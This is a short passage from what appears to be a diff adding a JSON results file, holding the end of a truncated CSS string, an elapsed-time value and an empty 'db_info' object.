font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 14.945098161697388
+    }
+  ],
+  "db_info": {}
+}
